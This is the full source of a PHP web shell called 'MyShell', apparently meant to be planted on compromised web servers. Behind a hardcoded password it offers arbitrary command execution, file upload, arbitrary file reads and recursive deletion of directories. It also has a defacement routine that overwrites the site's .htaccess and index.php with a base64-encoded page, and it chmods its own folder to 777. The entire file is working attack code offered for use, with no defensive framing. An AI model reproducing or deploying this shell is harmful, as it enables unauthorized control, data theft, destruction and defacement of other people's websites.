<?php
/** MyShell - PHP Web Shell
  * @author Naufal Hardiansyah
  * @license http://opensource.org/licenses/gpl-license.php GNU Public License
**/

/** STARTS USER SESSION **/
session_start();

/** DEFINES CONSTANT VARIABLES **/
define('SERVER_PATH', dirname(__FILE__) . "/");
define('SERVER_URL', substr($_SERVER['PHP_SELF'], 0, - (strlen($_SERVER['SCRIPT_FILENAME']) - strlen(SERVER_PATH))));
define('SERVER_TIME', date('m/d/Y h:i:s A'));

define('SHELL_VERSION', 'Build 2.1.0.3');
define('SHELL_COMMAND', strtolower($_GET['cmd']));
define('SHELL_DIR', $_GET['dir'] ? $_GET['dir'] : $_SERVER['DOCUMENT_ROOT']);
define('SHELL_TIMESTART', microtime_float());
define('SHELL_PASSWORD', 'lolbitch');
define('SHELL_ACCESS', isset($_SESSION['myshellaccess']) ? true : false);
define('SHELL_MODE', SHELL_ACCESS ? strtolower($_GET['mode']) : 'none');

define('MAX_EXECUTION', 0);

/** SETS PHP EXECUTION LIMIT **/
set_time_limit(MAX_EXECUTION);

/** STARTS OUTPUT BUFFERING **/
ob_start();

/** HANDLES REQUEST **/
switch (SHELL_MODE) {
    /** MODE: FILE UPLOAD **/
    case 'upload':
        if (isset($_POST['targetpath'])) {
            /** BEGINS FILE UPLOAD OPERATION **/
            $TARGET = $_POST['targetpath'];
            $TARGET = $TARGET . basename($_FILES['uploadedfile']['name']);
            print (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $TARGET) ? "The file ".  basename( $_FILES['uploadedfile']['name']). " has been uploaded" : "There was an error uploading the file, please try again!") . "\n";
        }

        /** INITIALIZES HTML FILE UPLOAD FORM **/
        print '<h3>File Upload</h3>Here you can upload any files, you may change the target path to your desired one.<br />You might not able to upload some files, it all depends on the server permissions.<br /><br /><form enctype="multipart/form-data" action="?mode=upload" method="POST"><table><input type="hidden" name="MAX_FILE_SIZE" value="100000" /><tr><td>Choose a file to upload:: <input name="uploadedfile" type="file" /></td></tr><tr><td>Target Path:: <input name="targetpath" type="text" value="' . SERVER_PATH . '" /><input type="submit" value="Upload File" /></td></tr></table></form>';
        break;
    /** MODE: DIRECTORY WIPE OUT **/
    case 'wipe':
        /** BEGINS FILES DELETION OPERATION **/
        (!is_dir(SHELL_DIR) ? unlink(SHELL_DIR) : deleteDirectory(SHELL_DIR));                  

        /** INITIALIZES WEB DEFACE PAGE TO DOCUMENT ROOT **/
        if (isset($_GET['deface'])) {
            /** CREATES A NEW .HTACCESS **/
            $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/.htaccess', 'w');
            fwrite($fp, 'ErrorDocument 404 /index.php');
            fclose($fp);

            /** CREATES A NEW INDEX.PHP **/
            $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/index.php', 'w');
            fwrite($fp, base64_decode('PD9waHANCi8qKiBXZWJEZWZhY2UgVGVtcGxhdGUgKEVuY3J5cHRlZCkNCiAgKiBAYXV0aG9yIFNw YXgNCiAgKiBAbGljZW5zZSBodHRwOi8vb3BlbnNvdXJjZS5vcmcvbGljZW5zZXMvZ3BsLWxpY2Vu c2UucGhwIEdOVSBQdWJsaWMgTGljZW5zZQ0KICAqIEBjcmVkaXRzIEdvb2dsZSwgaW5jDQogICoN CiAgKiBERVZFTE9QRVJTIFBMRUFTRSBOT1RFDQogICogV2UgcmVxdWVzdCB5b3UgcmV0YWluIHRo ZSBmdWxsIGNvcHlyaWdodCBub3RpY2UgYmVsb3cgaW5jbHVkaW5nIHRoZSBsaW5rIHRvIGluZmlu aXR5LWFydHMuY29tDQogICogVGhpcyBub3Qgb25seSBnaXZlcyByZXNwZWN0IHRvIHRoZSBsYXJn ZSBhbW91bnQgb2YgdGltZSBnaXZlbiBmcmVlbHkgYnkgdGhlIGRldmVsb3BlcnMNCiAgKiBidXQg YWxzbyBoZWxwcyBidWlsZCBpbnRlcmVzdCwgdHJhZmZpYyBhbmQgdXNlIG9mIEluZmluaXR5QXJ0 cy4gSWYgeW91IChob25lc3RseSkgY2Fubm90IHJldGFpbg0KICAqIHRoZSBmdWxsIGNvcHlyaWdo dCB3ZSBhc2sgeW91IGF0IGxlYXN0IGxlYXZlIGluIHBsYWNlIHRoZSAiUG93ZXJlZCBieSBJbmZp bml0eUFydHMiIGxpbmUsIHdpdGgNCiAgKiAiSW5maW5pdHlBcnRzIiBsaW5rZWQgdG8gd3d3Lmlu ZmluaXR5LWFydHMuY29tLiBJZiB5b3UgcmVmdXNlIHRvIGluY2x1ZGUgZXZlbiB0aGlzIHRoZW4g c3VwcG9ydCBvbiBvdXINCiAgKiBTaGVsbCBtYXkgYmUgYWZmZWN0ZWQuDQoqKi8NCg0KLyoqIERF RklORVMgQ09OU1RBTlQgVkFSSUFCTEVTICoqLw0KZGVmaW5lKFBIUF9VUkwsICRfU0VSVkVSWydT RVJWRVJfTkFNRSddKTsNCmRlZmluZShQSFBfSVAsICRfU0VSVkVSWydSRU1PVEVfQUREUiddKTsN CmRlZmluZShERUZfVElUTEUsICJJbmZpbml0eUFydHMgIC0gTGVnYWwgV2FybmluZyIpOw0KZGVm aW5lKERFRl9NRVNTQUdFLCAiUmVnYXJkaW5nIENvcHlyaWdodCBJbmZyaW5nZW1lbnQgYXQgIiAu IFBIUF9VUkwgLiAiIHdoaWNoIHJlc29sdmVzIHRvIElQIGFkZHJlc3MgIiAuIFBIUF9JUCAuICIu PGhyIC8+XG5EZWFyIEFidXNlLFxuXG5Zb3UgYXJlIG5vdCBhbGxvd2VkIHRvIHVzZSBvdXIgcHJl Y2lvdXMgd29yayB3aGljaCBpbmNsdWRlcyA8Yj5BSFBDTVM8L2I+IGFuZCA8Yj5NRXh0PC9iPiB3 aXRob3V0IHBlcm1pc3Npb24uIFBsZWFzZSBidXkgdGhlIG9yaWdpbmFsIGxpY2Vuc2VkIGZpbGVz LCBvdGhlcndpc2UgeW91IHdpbGwga2VlcCBnZXR0aW5nIHRoaXMgbWVzc2FnZS4gSWYgeW91IHNo b3VsZCBoYXZlIGFueSBxdWVzdGlvbnMgYWJvdXQgdGhpcyB3YXJuaW5nLCBwbGVhc2UgY29udGFj dCBtZSBpbW1lZGlhdGVseSBhdCBzcGF4bGltaXRlZEB5YWhvby5jb21cblxuU2luY2VyZWx5LFxu VGhlIEluZmluaXR5QXJ0cyBUZWFtLjxiciAvPiIgLiBzaGVsbF9leGVjKCdTWVNURU1JTkZPJykp Ow0KZnVuY3Rpb24gbGluZWJyKCRpbnB1dCkgew0KICAgICRkYXRhWydsaW5lJ10gPSBleHBsb2Rl KCJcbiIsICRpbnB1dCk7DQogICAgJGRhdGFbJ3Jlc3VsdCddID0gIiI7DQogICAgZm9yICgkaSA9 IDA7ICRpIDwgJGNvdW50ID0gY291bnQoJGRhdGFbJ2xpbmUnXSk7ICRpKyspIHsNCiAgICAgICAg JGRhdGFbJ3Jlc3VsdCddIC49ICRkYXRhWydsaW5lJ11bJGldIC4gIjxiciAvPiI7DQogICAgfSBy ZXR1cm4gdHJpbSgkZGF0YVsncmVzdWx0J10pOw0KfQ0KPz4NCjwhRE9DVFlQRSBodG1sPg0KPGh0 bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIGRpcj0ibHRyIiBsYW5nPSJl biI+DQo8aGVhZD4NCiAgIDxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0i dGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KICAgPHRpdGxlPjw/cGhwIHByaW50IERFRl9U SVRMRTsgPz48L3RpdGxlPg0KICAgPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRw Oi8vaWNvbnMuaWNvbmFyY2hpdmUuY29tL2ljb25zL2RlbGVrZXQvc29mdC1zY3JhcHMvMjQvQnV0 dG9uLVdhcm5pbmctaWNvbi5wbmciIHR5cGU9ImltYWdlL3gtaWNvbiI+DQogICA8c3R5bGUgdHlw ZT0idGV4dC9jc3MiPg0KICAgICAgaHRtbCB7DQogICAgICAgICBiYWNrZ3JvdW5kOiAjZjlmOWY5 Ow0KICAgICAgfQ0KICAgICAgYm9keSB7DQogICAgICAgICBiYWNrZ3JvdW5kOiAjZmZmOw0KICAg ICAgICAgY29sb3I6ICMzMzM7DQogICAgICAgICBmb250LWZhbWlseTogIkx1Y2lkYSBHcmFuZGUi LCBWZXJkYW5hLCBBcmlhbCwgIkJpdHN0cmVhbSBWZXJhIFNhbnMiLCBzYW5zLXNlcmlmOw0KICAg ICAgICAgbWFyZ2luOiAyZW0gYXV0bzsNCiAgICAgICAgIHdpZHRoOiA3MDBweDsNCiAgICAgICAg IHBhZGRpbmc6IDFlbSAyZW07DQogICAgICAgICAtbW96LWJvcmRlci1yYWRpdXM6IDExcHg7DQog ICAgICAgICAta2h0bWwtYm9yZGVyLXJhZGl1czogMTFweDsNCiAgICAgICAgIC13ZWJraXQtYm9y ZGVyLXJhZGl1czogMTFweDsNCiAgICAgICAgIGJvcmRlci1yYWRpdXM6IDExcHg7DQogICAgICAg ICBib3JkZXI6IDFweCBzb2xpZCAjZGZkZmRmOw0KICAgICAgfQ0KICAgICAgI2Vycm9yLXBhZ2Ug ew0KICAgICAgICAgbWFyZ2luLXRvcDogNTBweDsNCiAgICAgIH0NCiAgICAgICNlcnJvci1wYWdl IHAgew0KICAgICAgICAgZm9udC1zaXplOiAxMnB4Ow0KICAgICAgICAgbGluZS1oZWlnaHQ6IDE4 cHg7DQogICAgICAgICBtYXJnaW46IDI1cHggMCAyMHB4Ow0KICAgICAgfQ0KICAgICAgI2Vycm9y LXBhZ2UgY29kZSB7DQogICAgICAgICBmb250LWZhbWlseTogQ29uc29sYXMsIE1vbmFjbywgbW9u b3NwYWNlOw0KICAgICAgfQ0KICAgICAgICAgPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5IGlkPSJl cnJvci1wYWdlIj4NCiAgIDxjZW50ZXI+PGlmcmFtZSBzdHlsZT0idmlzaWJsZTogZmFsc2U7IiB3 aWR0aD0iMSIgaGVpZ2h0PSIxIiBzcmM9Imh0dHA6Ly93d3cueW91dHViZS5jb20vdi9uRnRSc2tN QVFvVT9mcz0xJmFtcDtobD1lbl9VUyZhbXA7cmVsPTAmYW1wO2F1dG9wbGF5PTEiIGZyYW1lYm9y ZGVyPSIwIiBhbGxvd2Z1bGxzY3JlZW4+PC9pZnJhbWU+DQogICA8L2NlbnRlcj4NCiAgIDxwIGlk PSJtZXNzYWdlIj4NCiAgICAgIEluaXRpYWxpemluZyBNZXNzYWdlLi4NCiAgIDwvcD4NCjwvYm9k eT4NCjxzY3JpcHQgbGFuZ3VhZ2U9IkphdmFTY3JpcHQiPg0KPCEtLQ0KdmFyIGRlbGF5ID0gNTA7 DQp2YXIgY3VycmVudENoYXIgPSAxOw0KdmFyIGRlc3RpbmF0aW9uID0gICJtZXNzYWdlIjsNCnZh ciB0ZXh0Ow0KDQpmdW5jdGlvbiB0eXBlKCkgew0KICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5 SWQpDQogIHsNCiAgICB2YXIgZGVzdD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZChkZXN0aW5hdGlv bik7DQogICAgaWYgKGRlc3QpIHsNCiAgICAgIGRlc3QuaW5uZXJIVE1MPXRleHQuc3Vic3RyKDAs IGN1cnJlbnRDaGFyKTsNCiAgICAgIGN1cnJlbnRDaGFyKysNCiAgICAgIGlmIChjdXJyZW50Q2hh cj50ZXh0Lmxlbmd0aCkgew0KICAgICAgICBjdXJyZW50Q2hhciA9IDE7DQogICAgICAgIC8vc2V0 VGltZW91dCgidHlwZSgpIiwgNTAwMCk7DQogICAgICB9IGVsc2Ugew0KICAgICAgICBzZXRUaW1l b3V0KCJ0eXBlKCkiLCBkZWxheSk7DQogICAgICB9DQogICAgfQ0KICB9DQp9DQoNCmZ1bmN0aW9u IHN0YXJ0VHlwaW5nKHRleHRQYXJhbSwgZGVsYXlQYXJhbSwgZGVzdGluYXRpb25QYXJhbSkgew0K ICB0ZXh0ID0gdGV4dFBhcmFtOw0KICBkZWxheSA9IGRlbGF5UGFyYW07DQogIGN1cnJlbnRDaGFy ID0gMTsNCiAgZGVzdGluYXRpb24gPSBkZXN0aW5hdGlvblBhcmFtOw0KICB0eXBlKCk7DQp9DQoN CnN0YXJ0VHlwaW5nKCI8P3BocCBwcmludCBsaW5lYnIoREVGX01FU1NBR0UpOyA/PiIsIDUwLCBk ZXN0aW5hdGlvbik7DQovLy0tPg0KPC9zY3JpcHQ+DQo8L2h0bWw+'));
            fclose($fp);
        }
		
        print "\nFiles deletion completed successfuly";
        print "\nTarget: " . SHELL_DIR;
        break;
    /** MODE: COMMAND LINE EXECUTION **/
    case 'execute':
        $RESULT = shell_exec(SHELL_COMMAND);
        print '<h3>Command Line Execution</h3>' . (trim($RESULT) == '' ? 'No available output for command: ' . SHELL_COMMAND : $RESULT) . "\n";
        break;
    /** MODE: FILE READ **/
    case 'read':
        $DATA[1][1] = fopen(SHELL_DIR, "r");
        $DATA[0][0] = fread($DATA[1][1], filesize(SHELL_DIR));
        $DATA[0][1] = SHELL_DIR;
        print "<h3>File Read</h3>Data retrieved from {$DATA[0][1]}"
        . "\n\n" . "<textarea rows='25' cols='85'>{$DATA[0][0]}</textarea>";
        break;
    /** MODE: DEFAULT **/
    default:
        if (isset($_POST['password'])) {
            if ($_POST['password'] == SHELL_PASSWORD)
                $_SESSION['myshellaccess'] = true;            
        }
        print (SHELL_ACCESS OR isset($_SESSION['myshellaccess'])) ? '<h3>MyShell</h3>Things are hidden due to security purposes'
        : '<h3>Restricted Area</h3><form enctype="multipart/form-data" action="?mode=default" method="POST">Admin Password:: <input name="password" type="password" value="Password" onclick="this.value=\'\'" /><input type="submit" value="Submit" /></form>';
        break;
}

function microtime_float() {
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}

function deleteDirectory($dir) {
    if ($handle = opendir($dir)) {
        while (false !== ($file = readdir($handle))) {
            if ($file != "." && $file != "..") {
                $dir2 = $dir . '/' . $file;
                if (is_dir($dir2)) {
                    deleteDirectory($dir2);
                } else {
                    /** PHP 4 **/ print (unlink($dir2) ? 'Deleted file: ' : 'Failed to delete file: ') . $dir2 . "\n"; $c++;
                    /** PHP 5 try { unlink($dir2);
                        $OUTPUT .= 'Deleted file: ' . $dir2 . "\n";
                    } catch (Exception $e) {
                        $OUTPUT .= 'Failed to delete file: ' . $dir2 . "\n";
                    } $c++; **/
                }
            }
        }
        closedir($handle);
    }
    rmdir($dir);
}

/** PRINT FINAL OUTPUT **/
$OUTPUT = ob_get_contents();
ob_end_clean();

/** INITIALIZE SHELL OUTPUT **/
$INFO[0] = chmod(SERVER_PATH, 777) ? 'Shell Initialized' : 'Failed to initialize shell';
$INFO[1] = microtime_float() - SHELL_TIMESTART;
$INFO[2] = SHELL_MODE;
$INFO[3] = SERVER_PATH;
$INFO[4] = SERVER_TIME;
$INFO[5] = SHELL_VERSION;

print "
<!DOCTYPE html>
<!-- Manyuu Hikenchou <3 -->
<html xmlns='http://www.w3.org/1999/xhtml' dir='ltr' lang='en'>
<head>
   <meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
   <title>{$_SERVER['SERVER_ADDR']}</title>
   <link rel='shortcut icon' href='http://icons.iconarchive.com/icons/deleket/soft-scraps/24/Button-Warning-icon.png' type='image/x-icon'>
   <style type='text/css'>
      /*<![CDATA[*/
      html {
         background: #f9f9f9;
      }
      body {
         background: #fff;
         color: #333;
         font-family: 'Lucida Grande', Verdana, Arial, 'Bitstream Vera Sans', sans-serif;
         margin: 2em auto;
         width: 700px;
         padding: 1em 2em;
         -moz-border-radius: 11px;
         -khtml-border-radius: 11px;
         -webkit-border-radius: 11px;
         border-radius: 11px;
         border: 1px solid #dfdfdf;
      }
      #error-page {
         margin-top: 50px;
      }
      #error-page p {
         font-size: 12px;
         line-height: 18px;
         margin: 25px 0 20px;
      }
      #error-page code {
         font-family: Consolas, Monaco, monospace;
      }
      /*]]>*/
      </style>
</head>
<body id='error-page'>
   <p id='message'>
    <pre class='output'>{$OUTPUT}<hr />Server time: {$INFO[4]}<br />Execution time: {$INFO[1]}<br />Current mode: {$INFO[2]}<br />Script location: {$INFO[3]}<br />{$INFO[5]}
    </pre>
   </p>
</body>
</html>";
?>>